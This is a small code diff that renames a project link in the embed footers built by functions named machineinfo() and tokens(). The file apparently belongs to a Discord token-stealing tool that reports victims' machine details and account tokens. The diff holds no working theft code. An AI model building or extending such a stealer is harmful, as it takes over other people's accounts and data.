@@ -93,7 +93,7 @@ def machineinfo():
                     }
                 ],
                 "footer": {
-                    "text": "zakocord. | https://github.com/zakocord/Lucent"
+                    "text": "zakocord. | github.com/zakocord/Astryrean/"
                 }
             }
         ]
@@ -297,7 +297,7 @@ def tokens(token: str):
                         }
                     ],
                     "footer": {
-                        "text": "zakocord. | github.com/zakocord/Lucent"
+                        "text": "zakocord. | github.com/zakocord/Astryrean/"
                     },
                     "thumbnail": {
                         "url": avatar_url
